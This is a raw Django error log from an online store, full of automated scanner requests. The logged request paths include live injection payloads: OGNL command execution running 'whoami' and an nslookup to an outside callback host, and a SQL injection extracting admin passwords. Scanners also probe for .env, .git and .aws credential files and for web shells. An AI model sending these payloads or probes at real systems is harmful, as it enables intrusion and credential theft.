a= 15  2023-10-28 15:58:30.022154
a= 16  2023-10-28 15:58:30.023169
Internal Server Error: /admin
Traceback (most recent call last):
  File "/home/ubuntu/store/lib/python3.11/site-packages/django/core/handlers/exception.py", line 56, in inner
    response = get_response(request)
               ^^^^^^^^^^^^^^^^^^^^^
  File "/home/ubuntu/store/lib/python3.11/site-packages/django/utils/deprecation.py", line 135, in __call__
    response = self.process_request(request)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/ubuntu/store/lib/python3.11/site-packages/django/middleware/common.py", line 54, in process_request
    path = self.get_full_path_with_slash(request)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/ubuntu/store/lib/python3.11/site-packages/django/middleware/common.py", line 88, in get_full_path_with_slash
    raise RuntimeError(
RuntimeError: You called this URL via POST, but the URL doesn't end in a slash and you have APPEND_SLASH set. Django can't redirect to the slash URL while maintaining POST data. Change your form to point to 103.215.221.135/admin/ (note the trailing slash), or set APPEND_SLASH=False in your Django settings.
Not Found: /robots.txt
Not Found: /index.php/Admin/public/Login.html
Not Found: /robots.txt
Not Found: /sitemap.xml
Not Found: /.well-known/security.txt
Not Found: /robots.txt
Not Found: /.env
Forbidden (CSRF cookie not set.): /
Not Found: /wp-login.php
Not Found: /.env
Forbidden (CSRF cookie not set.): /
Not Found: /.env
Not Found: /wp-login.php
Not Found: /wp-login.php
Not Found: /.env
Forbidden (CSRF cookie not set.): /
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /wp-content/plugins/blog-designer-pack/assets/css/slick.css
Not Found: /robots.txt
Not Found: /.env
Not Found: /robots.txt
Not Found: /ads.txt
Not Found: /robots.txt
Not Found: /boaform/admin/formLogin
Not Found: /manager/html
Not Found: /cluster/list.query
Not Found: /wp-json
Not Found: /wp-json/
Not Found: /robots.txt
Not Found: /robots.txt
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2020/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /webui/
Not Found: /favicon.ico
Not Found: /geoserver/web/
Not Found: /app/.env
Not Found: /app
Not Found: /robots.txt
Not Found: /sitemap.xml
Not Found: /.well-known/security.txt
Not Found: /boaform/admin/formLogin
check_mobile_phone_for_post=26220 2023-10-29 09:11:54.874404
is it 2023-10-29 09:11:54.874964
Not Found: /boaform/admin/formLogin
Internal Server Error: /post_info/edit_post_add_address/18
Traceback (most recent call last):
  File "/home/ubuntu/store/lib/python3.11/site-packages/django/core/handlers/exception.py", line 56, in inner
    response = get_response(request)
               ^^^^^^^^^^^^^^^^^^^^^
  File "/home/ubuntu/store/lib/python3.11/site-packages/django/core/handlers/base.py", line 197, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/ubuntu/store/lib/python3.11/site-packages/django/contrib/auth/decorators.py", line 23, in _wrapped_view
    return view_func(request, *args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/ubuntu/spadelc/post_information/views.py", line 280, in edit_post_add_address
    deffTime =int(datetime.datetime.now(datetime.timezone.utc).timestamp()-user.codeVarifySmsDate.timestamp())
                                                                           ^^^^
NameError: name 'user' is not defined
Not Found: /favicon.ico
check_mobile_phone_for_post=13816 2023-10-29 09:34:28.794825
is it 2023-10-29 09:34:28.795704
check_mobile_phone_for_post=27650 2023-10-29 09:37:13.431732
is it 2023-10-29 09:37:13.432658
check_mobile_phone_for_post=26516 2023-10-29 09:41:00.866111
is it 2023-10-29 09:41:00.866710
Not Found: /robots.txt
Not Found: /robots.txt
Not Found: /boaform/admin/formLogin
Not Found: /robots.txt
Not Found: /sitemap.xml
Not Found: /boaform/admin/formLogin
Not Found: /cgi/conf.bin
Not Found: /.env
Not Found: /favicon.ico
Not Found: /boaform/admin/formLogin
Not Found: /robots.txt
Not Found: /sitemap.xml
Not Found: /core/.env
Not Found: /favicon.ico
Not Found: /robots.txt
Not Found: /.git/config
Not Found: /favicon.ico
Not Found: /robots.txt
Not Found: /.git/config
Not Found: /robots.txt
Not Found: /robots.txt
Not Found: /.git/config
Not Found: /favicon.ico
Not Found: /.svn/entries
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /robots.txt
Not Found: /wp-includes/ID3/license.txt
Not Found: /feed/
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /2020/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /2021/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /cf_scripts/scripts/ajax/ckeditor/ckeditor.js
Not Found: /.env
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /wp-content/plugins/mm-plugin/inc/vendors/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /wp-content/plugins/jekyll-exporter/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /wp-content/plugins/dzs-videogallery/class_parts/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /wp-content/plugins/cloudflare/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
Not Found: /vendor/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /vendor/phpunit/Util/PHP/eval-stdin.php
Not Found: /phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /phpunit/phpunit/Util/PHP/eval-stdin.php
Not Found: /phpunit/src/Util/PHP/eval-stdin.php
Not Found: /phpunit/Util/PHP/eval-stdin.php
Not Found: /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /lib/phpunit/phpunit/Util/PHP/eval-stdin.php
Not Found: /lib/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /lib/phpunit/Util/PHP/eval-stdin.php
Not Found: /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /wp-login.php
Not Found: /favicon.ico
Not Found: /favicon.ico
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /.env
Not Found: /robots.txt
Not Found: /ads.txt
Not Found: /wp-content/plugins/WordPressCore/include.php
Not Found: /simple.php
Not Found: /robots.txt
Not Found: /api/.env
Not Found: /.aws/credentials
Not Found: /wp-content/themes/themify-ultra/style.css
Not Found: /wp-includes/css/buttons.css
Not Found: /wp-login.php
Not Found: /favicon.ico
Not Found: /__media__/js/trademark.php
Not Found: /robots.txt
Not Found: /alton/product/چراغ-پنلی-smd-توکار-65-وات-60x60-پارس-شعاع-توس-مدل-صدفی
Not Found: /.git/config
Not Found: /.env
Not Found: /robots.txt
Not Found: /actuator/health
Not Found: /robots.txt
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /inc/imgcode.asp
Not Found: /.env
Forbidden (CSRF cookie not set.): /
Not Found: /sitecore/shell/sitecore.version.xml
Not Found: /wp-includes/css/buttons.min.css
Not Found: /cf_scripts/scripts/ajax/ckeditor/ckeditor.js
Not Found: /robots.txt
Not Found: /robots.txt
Not Found: /brand/آلتون/
Not Found: /brand/بدیع-نور/
Not Found: /canon/product/لامپ-اشکی-۶وات-پارس-شعاع-توس
Not Found: /category/آیفون-تصویری/
Not Found: /category/براکت/
Not Found: /category/تلویزیون-شهری/
Not Found: /category/جک-درب-پارکینگی/
Not Found: /category/خانواده-حبابی/
Not Found: /category/خانواده-شمعی/
Not Found: /category/روشنایی/
Not Found: /category/سیم-و-کابل/
Not Found: /category/سینی-کابل-گالوانیزه-و-pvc/
Not Found: /category/قاب-هالوژن/
Not Found: /category/لامپ/
Not Found: /category/لامپ-ادیسونی/
Not Found: /category/لامپ-ال-ای-دی/
Not Found: /category/لامپ-هالوژن/
Not Found: /category/لامپ-کم-مصرف/
Not Found: /category/لوارم-چاه-ارت/
Not Found: /category/لوستر-و-آویز/
Not Found: /category/لوله-برق-و-اتصالات/
Not Found: /category/هواکش-و-فن-تهویه/
Not Found: /category/پرژکتور/
Not Found: /category/پنل‌ها/
Not Found: /category/چراغ/
Not Found: /category/چراغ-حیاطی/
Not Found: /category/چراغ-دیواری-توکار/
Not Found: /category/چراغ-دیواری-روکار/
Not Found: /category/چراغ-سقفی-توکار/
Not Found: /category/چراغ-سقفی-روکار/
Not Found: /category/چراغ-پنل-توکار/
Not Found: /category/چراغ-پنل-روکار/
Not Found: /category/کلید-و-پریز/
Not Found: /category/یو-پی-اس-ups/
Not Found: /niro-cable-zagros/product/لامپ-اشکی-۶وات-پارس-شعاع-توس
Not Found: /product/لامپ-اشکی-۶وات-پارس-شعاع-توس
Not Found: /product/چراغ-پنلی-smd-توکار-65-وات-60x60-پارس-شعاع-توس-مدل-صدفی
Not Found: /آلتون/product/apple-cinema-30
Not Found: /آلتون/product/imac
Not Found: /آلتون/product/iphone
Not Found: /آلتون/product/ipod-classic
Not Found: /آلتون/product/ipod-nano
Not Found: /آلتون/product/ipod-shuffle
Not Found: /آلتون/product/macbook
Not Found: /آلتون/product/macbook-air
Not Found: /آلتون/product/macbook-pro
Not Found: /آلتون/product/چراغ-پنلی-smd-توکار-65-وات-60x60-پارس-شعاع-توس-مدل-صدفی
Not Found: /robots.txt
Not Found: /ReportServer
Not Found: /wordpress
Not Found: /Wordpress
Not Found: /WORDPRESS
Not Found: /WordPress
Not Found: /wp
Not Found: /Wp
Not Found: /WP
Not Found: /old
Not Found: /Old
Not Found: /OLD
Not Found: /oldsite
Not Found: /new
Not Found: /New
Not Found: /NEW
Not Found: /wp-old
Not Found: /2022
Not Found: /2020
Not Found: /2019
Not Found: /2018
Not Found: /backup
Not Found: /test
Not Found: /Test
Not Found: /TEST
Not Found: /demo
Not Found: /bc
Not Found: /www
Not Found: /WWW
Not Found: /Www
Not Found: /2021
Not Found: /main
Not Found: /old-site
Not Found: /bk
Not Found: /Backup
Not Found: /BACKUP
Not Found: /SHOP
Not Found: /Shop
Not Found: /shop
Not Found: /bak
Not Found: /sitio
Not Found: /bac
Not Found: /sito
Not Found: /site
Not Found: /Site
Not Found: /SITE
Not Found: /blog
Not Found: /BLOG
Not Found: /Blog
Not Found: /boaform/admin/formLogin
Not Found: /category/pc/
Not Found: /druid/index.html
Not Found: /favicon.ico
Not Found: /phpmyadmin/index.php
Not Found: /pmd/index.php
Not Found: /phpmyadmin4.8.5/index.php
Not Found: /favicon.ico
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2020/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /robots.txt
Not Found: /favicon.ico
Not Found: /aaa9
Not Found: /aab8
Not Found: /favicon.ico
Not Found: /boaform/admin/formLogin
Not Found: /wp-includes/css/buttons.css
Not Found: /codeimg.php
Not Found: /actuator/health
Not Found: /favicon.ico
Not Found: /boaform/admin/formLogin
Not Found: /.env
Not Found: /wp-login.php
Not Found: /robots.txt
Not Found: /ads.txt
Not Found: /favicon.ico
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2020/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /robots.txt
Not Found: /hudson
Not Found: /.env
Forbidden (CSRF cookie not set.): /
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /robots.txt
Not Found: /robots.txt
Not Found: /stalker_portal/server/tools/auth_simple.php
Not Found: /robots.txt
Not Found: /__media__/js/trademark.php
Not Found: /boaform/admin/formLogin
Not Found: /portal/redlion
Not Found: /wp-includes/css/buttons.css
Not Found: /robots.txt
Not Found: /sitemap.xml
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2020/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /robots.txt
Not Found: /sitemap.txt
Not Found: /boaform/admin/formLogin
Not Found: /atom.xml
Not Found: /sitemaps.xml
Not Found: /sitemap.xml
Not Found: /sitemap.xml.gz
Not Found: /.env
Not Found: /sitemap_index.xml
Not Found: /.env
Not Found: /webui/
Not Found: /favicon.ico
Not Found: /geoserver/web/
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /robots.txt
Not Found: /wp-content/themes/signify/firkon.php
Not Found: /wp-content/themes/mero-megazines/ws.php
Not Found: /wp-admin/css/colors/coffee/index.php
Not Found: /.well-known/acme-challenge/license.php
Not Found: /wp-content/plugins/envato-market/inc/class-envato-market-api.php
Not Found: /.well-known/acme-challenge/index.php
Not Found: /wp-includes/Requests/Text/index.php
Not Found: /wp-content/plugins/classic-editor/wp-login.php
Not Found: /radio.php
Not Found: /wp-content/plugins/fix/up.php
Not Found: /cjfuns.php
Not Found: /1975.php
Not Found: /shell20211028.php
Not Found: /wp-content/plugins/press/wp-class.php
Not Found: /boaform/admin/formLogin
Not Found: /favicon.ico
Not Found: /favicon.ico
Not Found: /robots.txt
Not Found: /wp-login.php
Not Found: /manager/text/list
Not Found: /favicon.ico
Not Found: /robots.txt
Not Found: /ads.txt
Not Found: /Public/home/js/check.js
Not Found: /HNAP1/
Not Found: /.env
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2020/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /favicon.ico
Not Found: /favicon.ico
Not Found: /boaform/admin/formLogin
Not Found: /robots.txt
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2020/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /sitemap.txt
Not Found: /wp-login.php
Not Found: /wp-content/plugins/WordPressCore/include.php
Not Found: /webui/
Not Found: /favicon.ico
Not Found: /geoserver/web/
Not Found: /atom.xml
Not Found: /sitemaps.xml
Not Found: /sitemap.xml
Not Found: /sitemap.xml.gz
Not Found: /sitemap_index.xml
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /c/
Not Found: /api/common/pool
Not Found: /cgi-bin/upload/web-ftp.cgi
Not Found: /bic/ssoService/v1/applyCT
Not Found: /dashboard/snapshot/{{constructor.constructor('alert(document.domain)')()}}
Not Found: /crowd/console/login.action
Not Found: /.badarg.log
Not Found: /_notes/dwsync.xml
Not Found: /webadmin/clientlogin/
Not Found: /index.php
Not Found: /tag_test_action.php
Not Found: /wpad.dat
Not Found: /index.php
Not Found: /wp-content/plugins/sniplets/view/sniplets/warning.php
Not Found: /KeepAlive.jsp
Not Found: /admin.php
Not Found: /wp-content/plugins/w3-total-cache/pub/minify.php
Not Found: /uddiexplorer/SearchPublicRegistries.jsp
Not Found: /wp-content/plugins/cherry-plugin/admin/import-export/download-content.php
Forbidden (CSRF cookie not set.): /
Not Found: /spre/auth/login
Not Found: /api/edr/sangforinter/v2/cssp/slog_client
Not Found: /cgi-bin/luci
Not Found: /jsonapi/user/user
Not Found: /index.php
Not Found: /b/l.e
Not Found: /http_header.php
Not Found: /wp-content/plugins/translatepress-multilingual/readme.txt
Not Found: /login/
Not Found: /index.php
Not Found: /pro/login
Not Found: /specification/report.php
Not Found: /OA/PM/svc.asmx
Not Found: /classes/phpmailer/class.cs_phpmailer.php
Not Found: /pages/sdcall/Login.jsp
Not Found: /wp-json/buddypress/v1/signup
Not Found: /v2/api/product/manger/getInfo
Not Found: /htmltopdf/downfile.php
Not Found: /wp-content/plugins/limit-login-attempts-reloaded/readme.txt
Not Found: /wp-content/plugins/new-year-firework/firework/index.php
Not Found: /fetchBody
Not Found: /lfm.php
Not Found: /login.php
Not Found: /api/sonicos/auth
Not Found: /wp-content/plugins/cloudflare/readme.txt
Not Found: /jmx-console/
Not Found: /wt2parser.cgi
Not Found: /giveaway/mygiveaways/
Not Found: /remote/login
Not Found: /pme/media/
Not Found: /index.php
Not Found: /yyoa/ext/trafaxserver/SystemManage/config.jsp
Not Found: /goforms/rlminfo
Not Found: /goform/downloadSyslog/syslog.log
Not Found: /duomiphp/ajax.php
Not Found: /wp-content/plugins/worker/readme.txt
Not Found: /session/language
Not Found: /getCorsFile
Not Found: /properties-list.php
Not Found: /login/
Not Found: /jasperserver/login.html
Not Found: /index.php
Not Found: /hue/accounts/login
Not Found: /${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("whoami").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))}/
Not Found: /api/2.0/services/usermgmt/password/wirvvc
Not Found: /monitoring
Not Found: /pandora_console/index.php
Not Found: /index.php
Not Found: /apply_sec.cgi
Not Found: /plug/oem/AspCms_OEMFun.asp
Not Found: /cgi-bin/downloadFlile.cgi
Not Found: /comm.php
Not Found: /api/v1/GetSrc
Not Found: /ie50/system/login/SysLoginUser.aspx
Not Found: /session/login
Not Found: /getCorsFile
Not Found: /properties-list.php
Not Found: /index.php
Not Found: /jasperserver-pro/login.html
Not Found: /${@java.lang.Runtime@getRuntime().exec("nslookup cl0u0lcdmeg5hcv83rd04nm8aic18hhsf.oast.fun")}/
Not Found: /api/2.0/services/usermgmt/password/wirvvc
Not Found: /..;/monitoring
Not Found: /pandora_console/index.php
Not Found: /index.php
Not Found: /cgi-bin/luci/
Not Found: /apply_sec.cgi
Not Found: /2XYprtZ70gsJUIyNm5dYf4mwWYg
Not Found: /viewrq.php
Not Found: /ws/msw/tenant/' union select (select ID from SGMSDB.DOMAINS limit 1), '', '', '', '', '', (select concat(id, ':', password) from sgmsdb.users where active = '1' order by issuperadmin desc limit 1 offset 0),'', '', '
Not Found: /solr/admin/
Not Found: /api/v1/GetDevice
Not Found: /system/login/SysLoginUser.aspx
Not Found: /archive/download
Not Found: /auth/admin
Not Found: /appliance/login
Not Found: /app/kibana
Not Found: /archive/download
Not Found: /aura
Not Found: /auth/admin/master/console/
Not Found: /s/sfsites/aura
Not Found: /sfsites/aura
Not Found: /s/aura
Not Found: /s/fact
Not Found: /assets/backend/elfinder/elfinder-cke.html
Not Found: /assets/elFinder-2.1.9/elfinder.html
Not Found: /assets/elFinder/elfinder.html
Not Found: /backend/elfinder/elfinder-cke.html
Not Found: /elfinder/elfinder-cke.html
Not Found: /uploads/assets/backend/elfinder/elfinder-cke.html
